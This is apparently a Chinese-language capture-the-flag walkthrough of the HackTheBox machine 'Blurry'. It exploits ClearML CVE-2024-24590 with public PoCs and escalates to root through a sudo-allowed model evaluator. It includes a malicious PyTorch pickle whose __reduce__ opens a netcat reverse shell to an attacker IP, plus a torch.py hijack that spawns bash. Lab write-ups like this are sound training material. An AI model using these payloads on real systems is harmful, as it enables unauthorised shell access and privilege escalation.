# Blurry

端口扫描

![image-20240806095527556](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806095527556.png)



只开放22，80两个端口

查看80端口

![image-20240806095604090](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806095604090.png)

将重定向域名添加到/etc/hosts文件，重新访问

![image-20240806095645485](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806095645485.png)



![image-20240806095742579](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806095742579.png)



需要登录，随便尝试aaa登录到dashboard

![image-20240806095904476](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806095904476.png)

![image-20240806100836556](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806100836556.png)

首页提示了clearMl的安装步骤，按照它的流程尝试在本地安装

![image-20240806101239232](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806101239232.png)

需要把上面的几个子域名添加到/etc/hosts文件

```
echo '10.10.11.19	app.blurry.htb api.blurry.htb files.blurry.htb'>>/etc/hosts
```

![image-20240806101454238](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806101454238.png)

重新尝试

![image-20240806101533799](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806101533799.png)



poc(https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC)

![image-20240806101642418](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806101642418.png)



```
python3 exploit.py default "Black Swan" "pwned4" "10.10.16.35" "1234"
python3 exploit.py cmd "Black Swan" "pwned4" --cmd "whoami"
```

![image-20240806102604572](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806102604572.png)

![image-20240806102616114](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806102616114.png)

攻击没成功，换个poc(https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)

![image-20240806105613949](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806105613949.png)

![image-20240806105621471](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806105621471.png)

成功拿到shell

sudo -l产看可执行的sudo命令

![image-20240806105910958](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806105910958.png)

攻击脚本

```python
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
	def __init__(self):
		super(MaliciousModel,self).__init__()
		self.dense=nn.Linear(10,1)
	def forward(self,demo):
		return self.dense(demo)
	def __reduce__(self):
		cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.35 1223 >/tmp/f"
		return os.system,(cmd,)
	
maliciousmodule=MaliciousModel()
torch.save(maliciousmodule,'exploit.pth')

    
```

脚本释意：

```
MaliciousModel Class: Defines a simple neural network model.
__reduce__ Method: Overridden to include a command that creates a reverse shell using netcat.
torch.save Function: Saves the model to a file named exploit.pth.
```

上传靶机

![image-20240806113303903](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806113303903.png)

```
cp exploit.pth /models/exploit.pth
```

![image-20240806113401351](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806113401351.png)



```
sudo /usr/bin/evaluate_model /models/exploit.pth
```

![image-20240806115014725](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806115014725.png)

弹shell失败

另一种方式

```
echo 'import os; os.system("bash")' > /models/torch.py

sudo /usr/bin/evaluate_model /models/demo_model.pth
```

![image-20240806115315471](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240806115315471.png)